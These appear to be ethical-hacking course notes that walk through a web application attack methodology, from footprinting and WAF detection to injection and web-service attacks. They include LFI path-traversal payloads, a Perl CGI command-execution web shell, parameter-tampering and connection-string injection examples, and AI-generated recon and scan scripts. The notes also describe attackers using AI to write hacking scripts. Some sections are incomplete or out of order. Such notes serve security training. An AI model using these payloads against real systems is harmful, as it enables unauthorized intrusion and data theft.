## 1. Web Application Hacking Methodology Overview

Attackers use the web application hacking methodology to gain knowledge about a particular web application to compromise it successfully. This methodology allows them to plan each step in detail to increase their chances of success. Under this methodology, they do the following:

1. **Footprint web infrastructure**
2. **Analyze web applications**
3. **Bypass client-side controls**
4. **Attack authentication mechanisms**
5. **Attack authorization schemes**
6. **Attack access controls**
7. **Attack session management mechanisms**
8. **Perform injection attacks**
9. **Attack application logic flaws**
10. **Attack shared environments**
11. **Attack database connectivity**
12. **Attack web application clients**
13. **Attack web services**

> **If hackers do not use this process and try to exploit the web application directly, their chances of failure increases.**

## 2. Footprint the Web Infrastructure

### What Footprinting Enables:
* **Server discovery** — Discover physical servers hosting web applications.
* **Service discovery** — Discover services running on web servers to determine attack paths.
* **Server identification** — Use banner grabbing to obtain server banners (make, version, local identity, local addresses, self-names).
* **WAF and proxy detection** — Discover web application firewall and proxy settings.
* **Hidden content discovery** — Extract content and functionality not directly linked from the main visible content.
* **Load balancers detection** — Detect load balancers and their real IP addresses to identify servers exposed over the Internet.
* **Web app technologies detection** — Detect underlying technologies (ASP, PHP, JSP, .NET, etc.).
* **WebSocket enumeration** — Identify WebSocket servers running on the target site.

### Server Discovery
Three techniques help discover active servers: **Whois lookup, DNS interrogation, and port scanning**.

#### Whois Lookup
Provides information about the IP address of the web server and DNS servers.

Extracts system-level data: account details, OS, software versions, database schemas.


### Detecting WAFs and Proxies

#### Detecting Proxies
Use the **TRACE** command to detect proxy servers:
```
TRACE / HTTP/1.1
```
If the request is modified with extra headers before reaching the web server — a proxy is present.

#### Detecting Web Application Firewalls (WAFs)
* Examine **cookies** — some WAFs add their own cookies during client-server communication.
* Analyze **HTTP header responses** — most firewalls edit HTTP headers.

**Tool: WAFW00F**
**Source:** [https://github.com](https://github.com)
* Identifies and fingerprints WAFs.
* Detects WAF by looking for: Cookies, Server cloaking, Response codes.

## 3. Analyze Web Applications

### Identify Entry Points for User Input
* **URL strings** — Identify parameters in GET requests.
* **POST data** — Contains authorization and session information.
* **HTTP headers** — Contain cookies, referer, user-agent.
* **Cookies** — Store session tokens and state information.

### Identify Server-Side Technologies
Server-side technologies include: **ASP, ASP.NET, ColdFusion, JSP, PHP, Python, Ruby on Rails**.
Attackers fingerprint active technologies using **HTTP fingerprinting**.

### Identify Server-Side Functionality
Evaluate server-side structure by keenly observing the applications revealed to the client.

### Identify Files & Directories
Attackers use automated tools like **Gobuster** to identify files and directories exposed on the Internet.

### Map the Attack Surface
Identify various attack surfaces and the vulnerabilities associated with them to target specific vulnerable areas.

### Techniques for Web Application Analysis:

#### Extracting Website Links
* **Octoparse** ([https://www.octoparse.com](https://www.octoparse.com)) — Automatic data extraction; scrapes web data without coding; turns web pages into structured data. Captures text, links, image URLs, or HTML code.
* **80legs** ([https://80legs.com](https://80legs.com)) — Web crawling service.
* Netpeak Spider, Link Extractor

#### Gathering a Wordlist from the Target Website (CeWL)
```bash

```
*Used to gather a wordlist for brute-force attacks on email addresses gathered earlier.*

#### Extracting Metadata from Public Documents
Tools: **ExifTool**, Web Data Extractor Pro, Metagoofil

**ExifTool** ([https://exiftool.org](https://exiftool.org)):
* Cross-platform Perl library and command-line app for reading, writing, and editing metadata.

#### Monitoring Web Pages for Updates and Changes

#### Searching for Contact Information
Attackers extract from company websites:
* Contact names, phone numbers, email addresses
* Company locations and branches
* Partner information, news, links, product/project data

## 4. Bypass Client-Side Controls

A developer uses techniques such as **hidden HTML form fields** and **browser extensions** to transmit data via the client. Attackers exploit the assumption that client-to-server data is within the user's control.

### Common Web Application Attacks for Bypassing Client-Side Controls:
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Parameter tampering
* HTTP parameter pollution
* Input field manipulation
* Hidden field manipulation
* Client-side input validation bypass
* Local storage / session storage manipulation
* JavaScript injection
* Cross-Origin Resource Sharing (CORS) misconfiguration
* Session fixation
* Attack browser extensions

### Attack Hidden Form Fields
E-commerce applications use hidden HTML form fields to restrict price/product modification.

**Process:**
1. Identify vulnerable web applications.
2. Save the source code for the HTML page.
3. Locate the hidden field.
4. Tamper with values (e.g., change the price field value).
5. Save the file and reload the source into a browser.
6. Click the Buy button — the modified price is transmitted to the server.

> *Use proxy tools like **Burp Suite** to trap and modify the request. Try entering negative price values to trigger refunds via credit card transactions.*

### Attack Browser Extensions
**Method 1: Intercepting Traffic from Browser Extensions**
* Use **Burp Suite** to capture and modify requests/responses.
* Limitation: Data obfuscation or encryption may prevent interception.

**Method 2: Decompiling Browser Extensions**
* Decompile the component's bytecode to view detailed source code.
* Allows modifying data regardless of obfuscation/encryption.

### Attack Google Chrome Browser Extensions
* Attackers lure victims into downloading a malicious file or visiting a malicious website.
* After malware installation, the browser forces specific actions (activating extensions, granting permissions).
* Attackers leverage Chrome Sync to add **fake malicious extensions** appearing legitimate.
* Gathered information via compromised Chrome browser:

**User Activity:**
* Spoken language, recently visited sites, media file types accessed, financial transactions, trusted contacts, geo-location, gyro and proximity sensor data.

**User-Created Personal Information:**
* Usernames, passwords, identities, financial account details, contact info, custom browser settings, social media activity, files uploaded.

**Other Information:**
* Files, news, data related to the user; third-party services (e-commerce, social media); cookies, pixel tags, application cache, browser web storage, server log files.

### Perform Source Code Review
Acquire and examine the target web application's source code to identify:
* Components, frameworks, and their working.
* Removing client-side input validation.
* Submitting non-standard data to the server.
* Manipulating client-side states or events.
* Directly invoking functionality present within the component.

## 5. Attack Authorization Mechanisms

### Parameter Tampering (Authorization Context)
Attackers manipulate the following to bypass authorization:

| Data Source | Attack |
| :--- | :--- |
| **URL Strings** | Change parameters in address bar (GET method). Use URIs to access protected documents, inject SQL queries, or make users view specific sites. |
| **POST Data** | Exploit vulnerabilities in POST data and manipulate authorization/session information. |
| **HTTP Headers** | Write custom programs or use tools to modify headers; bypass proxy access control by submitting two HTTP requests bound in the same header. |
| **Query Strings & Cookies** | Modify cookie content — ranges from session tokens to authorized decision-making arrays. |
| **Hidden Tags** | HTML hidden form fields stored and submitted as parameters; attackers edit the page source and reload in browser. |

### HTTP Request Tampering
Modify HTTP request data before the recipient reads it without using another user's ID.

#### Query String Tampering
If the query string is visible in the address bar, change the string parameter to bypass authorization:
```
http://target.com/admin?admin=false&itemID=201
# Tampered:
http://target.com/admin?admin=true&itemID=201
```
*Use web spidering tools like **Burp Suite** to scan for POST parameters.*

#### Cookie Parameter Tampering
**Source:** [https://portswigger.net](https://portswigger.net)
Steps:
1. Collect session cookies set by the web application; analyze to determine the cookie generation mechanism.
2. Trap the session cookie using **Burp Suite**; tamper its parameters.
3. Replay the tampered cookie to the application — gain unauthorized access to other profiles.

**Burp Suite** ([https://portswigger.net](https://portswigger.net)) — An integrated platform for web application security testing with tools for mapping, analysis, and exploitation.

## 6. Attack Access Controls

Access controls determine individual data access, levels of grant access, administrator functionality, and privilege escalation paths.

### Exploiting Insecure Access Controls:

| Method | Description |
| :--- | :--- |
| **Parameter-Based Access Control** | Identify parameters assigned to administrators (e.g., `admin=true`); set them in own requests to gain admin functions. |
| **Referer-Based Access Control** | The HTTP Referer header is considered unsafe — modify/manipulate it to access protected application functionalities. |
| **Location-Based Access Control** | Bypass location-based controls via web proxy, VPN, data-roaming mobile device, or direct manipulation of client-side mechanisms. |

### Access Control Attack Methods:
* **Different user accounts:** Use **Burp Suite** to compare two different user contexts.
* **Multistage processes:** Capture every request in a multistage process and test each for access controls; switch session token to a less privileged user's.
* **Static resources:** Request protected static resource URLs directly to test for unauthorized access.
* **Direct method access:** Access web application methods that accept requests directly.

## 7. Attack Session Management Mechanisms

### Session Token Analysis
Attackers capture multiple session tokens and analyze them to identify patterns or predictability.
* **Burp Suite Sequencer** — Analyzes randomness of session tokens.
* **JHijack** ([https://sourceforge.net](https://sourceforge.net))
* **Ettercap** ([https://www.ettercap-project.org](https://www.ettercap-project.org))

### Session Hijacking Techniques:
* **Token prediction** — Predicting future session IDs based on observable patterns.
* **Session replay** — Replaying captured session tokens.
* **Session fixation** — Setting a specific session ID before the victim authenticates.
* **Sidejacking** — Sniffing session cookies over an unencrypted network.

## 8. Perform Injection & Input Validation Attacks

Injection attacks exploit non-validated web application input vulnerabilities. Types include web script injection, OS command injection, SMTP injection, LDAP injection, and XPath injection.

Injection takes place when a browser sends user-provided data to the interpreter as part of a command or query. Because of injection flaws, attackers can **read, create, update, and remove any arbitrary data** available to the application and in some cases **bypass deeply nested firewalls** and take complete control.

### Injection Attack Types:

| Type | Description |
| :--- | :--- |
| **Web Scripts Injection** | If user input is used to dynamically execute code, enter crafted input that breaks the intended data context and executes commands on the server. |
| **OS Commands Injection** | Exploit operating systems by entering malicious code in input fields if applications utilize user input in a system-level command. |
| **SMTP Injection** | Inject arbitrary SMTP commands into applications and SMTP server conversations to generate large volumes of spam email. |
| **SQL Injection** | Enter a series of malicious SQL queries into input fields to directly manipulate the database. |
| **LDAP Injection** | Take advantage of non-validated web application input vulnerabilities to pass LDAP filters to obtain direct access to databases. |
| **XPath Injection** | Enter malicious strings in input fields to manipulate the XPath query so that it interferes with the application's logic. |
| **Buffer Overflow** | Inject a large amount of bogus data beyond the capacity of the input field. |
| **File Injection** | Inject malicious files by exploiting "dynamic file include" mechanisms in web applications. |
| **Canonicalization** | Manipulate variables that reference files with **dot-dot-slash (`../`)** to access restricted directories in the application. |

### Vulnerability Scanning
Use automated scanners to identify entry points for injection attacks.

### Perform Local File Inclusion (LFI)

LFI is a web security vulnerability that allows attackers to **read and upload files onto a server** via a web browser. It occurs when an application permits file inclusion solely based on user input without security checks, enabling manipulation with **path traversal characters**. Often triggered in **PHP-based websites**.

#### Vulnerable PHP Code:
```php
$file = $_GET['page'];
require($file);
```
**Attacker exploit** — Fetch `/etc/passwd` using path traversal:
```
http://xyz.com/page=../../../../../../etc/passwd
```

#### Evading Added `.php` Extension
If PHP appends `.php` to the filename:
```php
$file = $_GET['page'];
require($file.".php");
```
**Method 1 — Null Byte (`%00`) injection:**
```
http://xyz.com/page=../../../../../../etc/passwd%00
```
**Method 2 — Question mark (`?`) to break extension:**
```
http://xyz.com/page=../../../../../../etc/passwd?
```

#### Bypassing `.php` Execution (PHP Filter):
LFI can read `.txt` files but not `.php` files because they are executed. Use a built-in PHP filter to convert to Base64:
```
http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=index
```
*The entire page is Base64-encoded. Decode and save:*
```bash
base64 -d savefile.php
```

## 9. Attack Application Logic Flaws

Most application flaws arise from the negligence and false assumptions of developers. Application logic flaws are not associated with any common signatures, making them more difficult to identify — manual testing and vulnerability scanners cannot identify this type of flaw.

### Business Logic Bypass Attack
Targets specific or intended functionality of a web application. Manipulates the application's normal workflow or business rules. Leverages **logical flaws in the application's design**.

### Retail Web Application Logic Flaw Scenario
> **Scenario:** In most retail web applications, the process of placing an order includes:
> 1. Selecting the product
> 2. Finalizing the order
> 3. Providing payment details
> 4. Providing delivery details
>
> *The developer assumes customers follow all levels in sequence. Using proxy tools such as **Burp Suite**, attempt to control the requests and **bypass the third stage** (jump from stage 2 to stage 4). This is called **forced browsing**. This flaw enables the attacker to avoid paying the product price and still receive the product — causing severe financial losses at scale.*

### Attacking Multistage Processes
* Walk through a protected multistage process several times in the browser.
* Use proxy tools (Burp Suite) to switch session tokens at different steps to a less privileged user's session.

## 10. Attack Shared Environments

Organizations leverage third-party service providers for hosting and maintaining web applications using shared infrastructure. This leads to many threats:

### Attacks on the Access Mechanism
The application service provider provides an **administrative web interface** to configure and manage the web application. This remote access mechanism is vulnerable.
* Check whether the remote access mechanism has **unpatched vulnerabilities or configuration errors** that can be exploited.
* Check whether **access privileges are properly separated** between clients — a poor configuration may give customers shell access instead of file access, allowing access to sensitive files.

### Attacks Between Applications
Vulnerabilities in one web application may allow attackers to execute malicious scripts and compromise the security of other hosted web applications.

**Example — Remote Command Execution Script:**
```perl
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html("");
if (param()){
  my $command = param("cmmd");
  $command=`$command`;
  print "$command\n";
}
else {print start_form(); textfield("command");}
print end_html;
```
*By accessing this script over the Internet, attackers can execute OS commands such as `whoami`. An SQL injection vulnerability in one application may allow attackers to run arbitrary SQL commands and manipulate data of other applications.*

## 11. Attack Database Connectivity

Database connection strings connect applications to database engines. Attackers target the connection that links a database server with client software.

**Example connection string:**
```
Server=sql_box; Database=Common; User ID=uid; Pwd=password;
```

**Microsoft SQL Server connection string:**
```
"Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd;"
```

### Database Connectivity Attack Methods:
* **Connection String Injection** — Inject parameters into the connection string.
* **Hash Stealing** — Steal password hashes from connection configurations.
* **Port Scanning** — Identify database ports.
* **Hijacking Web Credentials** — Capture credentials from web-to-database communication.

*Example injected connection string altering authentication:*
```
User_Value: ; Data Source = Rogue_Server
Password_Value: ; Integrated Security = true
```

## 12. Attack Web Application Client

Attacks performed on a server-side application infect the client-side application when the client interacts with malicious servers or processes malicious data.

### Client-Side Attack Methods:

| Method | Description |
| :--- | :--- |
| **Cross-Site Scripting** | Attacker bypasses clients' ID security mechanism, obtains access privileges, and injects malicious scripts into web pages that can even rewrite HTML content. |
| **HTTP Header Injection** | Attacker splits an HTTP response into multiple responses by injecting a malicious response in an HTTP header — causes website defacement, cache poisoning, and XSS. |
| **Request Forgery Attack** | Exploits the trust of a website or web application on a user's browser by including a link that takes the user to an authenticated website. |
| **Privacy Attacks** | Tracking performed with a remote site by employing a leaked persistent browser state. |
| **Redirection Attacks** | Develop code and links resembling a legitimate site; the URL redirects the user to a malicious website where attackers obtain credentials. |
| **Frame Injection** | When scripts do not validate input, attackers inject code through frames. Affects all browsers and scripts that do not validate untrusted input. |
| **Session Fixation** | Helps attackers hijack valid user sessions — authenticate using a known session ID, then use it to hijack a user-validated session. Tricks users into accessing a genuine web server using an existing session ID value. |
| **ActiveX Attacks** | Attackers lure victims via email or a link that exploits remote execution code loopholes, obtaining access privileges equal to those of authorized users. |

## 13. Attack Web Services

Web services integrated within web applications become attack vectors when they are vulnerable. Web services work atop legacy web applications — any attack on a web service immediately exposes underlying application business logic vulnerabilities.

### Web Services Probing Attacks
WSDL files contain sensitive information about service ports and connections between machines. Attackers use WSDL probing attacks to obtain information about vulnerabilities in web services.

**Steps:**
1. Trap the WSDL document from web service traffic and analyze it to determine the purpose of the application, functional breakdown, entry points, and message types.
2. Create a set of valid requests by selecting operations and formulating request messages according to the XML schema rules.
3. Use these requests to include malicious contents in SOAP requests and analyze errors to gain a deeper understanding of potential security weaknesses.

### SOAP Injection
SOAP is a lightweight XML-based protocol for exchanging structured information on the web. SOAP injection includes special characters such as single quotes, double quotes, semicolons, etc.

*The attacker injects malicious query strings in the user input field to bypass web service authentication mechanisms and access backend databases. Works similarly to SQL injection attacks.*

### SOAPAction Spoofing
Every SOAP request message contains an operation executed by the application as the first child element in the SOAP body. When SOAP messages are transmitted using HTTP, an additional HTTP header called **SOAPAction** is used.

*Attacker can manipulate operations in the SOAPAction header to exploit a web service. For example, a web service with `createUser` and `deleteAllUsers` operations — if protected by a gateway where only authorized users can perform `deleteAllUsers` — an attacker in front of the gateway can forge the SOAPAction header to execute `deleteAllUsers` without direct access.*

### XML Injection
Attackers inject malicious XML content into SOAP messages to manipulate web service functionality or extract sensitive data.

### Other Web Service Attacks:

| Attack | Description |
| :--- | :--- |
| **Parameter Tampering** | Attacker changes values by superimposing one or more operating system commands via the request. Parsing is possible when `.bat` (batch) or `.cmd` (command) files are executed. |
| **Recursive Payloads** | Attacker queries for web services with a grammatically correct SOAP document containing **infinite processing loops**, exhausting the XML parser and CPU resources. |
| **Oversize Payloads** | Attacker sends an excessively large payload to **consume all system resources**, rendering web services inaccessible to legitimate users. |

### Web Service Attack Tools:

#### SoapUI
**Source:** [https://www.soapui.org](https://www.soapui.org)

Supports multiple protocols: **SOAP, REST, HTTP, JMS, AMF, and JDBC**. An attacker can use this tool to carry out:
* Web service probing
* SOAP injection
* XML injection
* Web service parsing attacks

#### XMLSpy
**Source:** [https://www.altova.com](https://www.altova.com)

An XML editor and development environment for modeling, editing, transforming, and debugging XML-related technologies.

## 15. Create and Run Custom Scripts with AI

Attackers can leverage AI-powered technologies to automate web application hacking tasks — creating custom footprinting and vulnerability scanning scripts.

### AI Custom Script Example 1 (Bash — Two-tool scan):
**Prompt:** `"Create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"`

**Generated Script:**
```bash
#!/bin/bash
target="www.certifiedhacker.com"
# Web Application Footprinting
echo "Starting web application footprinting..."
whatweb $target
wafw00f $target
# Vulnerability Scanning
echo "Starting vulnerability scanning..."
nikto -h $target
nmap -sV --script=http-vuln* $target
> web_scan.sh && chmod +x web_scan.sh && ./web_scan.sh
```
* `whatweb` — Identifies website technologies.
* `wafw00f` — Identifies the WAF in use.
* `nikto` — Detects vulnerabilities in web servers.
* `nmap` — Network scanner using HTTP vulnerability scripts.

### AI Custom Script Example 3 (Bash — Footprint then Scan with IP Extraction):
**Prompt:** `"create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url www.certifiedhacker.com"`

**Generated Script:**
```bash
#!/bin/bash
target="www.certifiedhacker.com"
# Web Application Footprinting
echo "Gathering information on $target..."
footprint_data=$(whatweb --color=never $target)
echo "$footprint_data"
# Extracting IP address for further scanning
ip_address=$(echo "$footprint_data" | grep -oP "IP:\s*\K[\d\.]+")
# Vulnerability Scanning
if [ -n "$ip_address" ]; then
    echo "Starting vulnerability scanning on IP: $ip_address..."
    nmap -sV --script=http-vuln* $ip_address
else
    echo "IP address not found, running vulnerability scan on hostname..."
    nmap -sV --script=http-vuln* $target
fi
> web_footprint_and_scan.sh && chmod +x web_footprint_and_scan.sh && ./web_footprint_and_scan.sh
```
* Uses `whatweb --color=never` to gather information without color codes.
* Extracts the IP address from gathered information using `grep`.
* If IP is found, performs vulnerability scan using extracted IP; otherwise uses the hostname.
